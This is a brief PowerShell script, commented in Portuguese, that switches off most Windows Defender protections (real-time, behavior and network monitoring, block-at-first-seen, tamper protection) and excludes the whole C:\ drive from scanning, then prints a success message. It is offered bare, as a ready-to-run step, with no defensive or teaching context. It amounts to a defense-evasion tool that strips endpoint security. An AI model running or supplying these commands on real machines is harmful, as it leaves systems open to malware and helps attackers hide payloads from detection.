# Desativa proteções do Windows Defender
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableBlockAtFirstSeen $true
Set-MpPreference -DisableNetworkProtection $true
Set-MpPreference -DisableTamperProtection $true

# Adiciona exclusão para o disco C:\ inteiro
Add-MpPreference -ExclusionPath "C:\"

# (Opcional) Exibe uma mensagem de confirmação (opcional)
Write-Host "Defender desativado e exclusão adicionada com sucesso."